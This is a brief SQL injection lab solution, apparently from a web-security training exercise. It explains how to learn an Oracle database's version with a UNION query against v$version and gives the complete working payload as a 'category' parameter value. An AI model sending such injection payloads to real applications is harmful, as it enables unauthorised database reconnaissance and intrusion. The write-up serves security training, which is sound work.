# Lab 7: SQL Injection Attack, Querying the Database Type and Version on Oracle

* **Solution**: Inject a UNION query to retrieve the Oracle version from v$version in a string-compatible column.
* **Final Payload**: category=Gifts' UNION SELECT banner, NULL FROM v$version --